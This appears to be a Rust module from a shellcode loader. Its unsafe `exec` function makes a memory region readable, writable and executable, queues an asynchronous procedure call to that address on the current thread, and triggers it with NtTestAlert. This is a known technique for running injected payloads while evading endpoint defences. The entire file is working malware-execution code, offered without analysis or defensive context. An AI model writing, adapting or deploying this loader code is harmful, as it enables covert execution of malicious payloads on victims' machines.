use crate::utils::RslResult;

pub unsafe fn exec(p: usize, size: usize) -> RslResult<()> {
    #[cfg(feature = "debug")]
    crate::utils::print_message("Executing via APC Syscall...");

    use crate::ntapi::{CURRENT_PROCESS, CURRENT_THREAD, PAGE_EXECUTE_READWRITE};
    crate::ntapi::protect_virtual_memory(CURRENT_PROCESS, p, size, PAGE_EXECUTE_READWRITE)?;

    crate::ntapi::queue_apc_thread(CURRENT_THREAD, p)?;

    // Trigger the APC by putting the thread into an alertable state
    crate::ntapi::test_alert()?;

    Ok(())
}
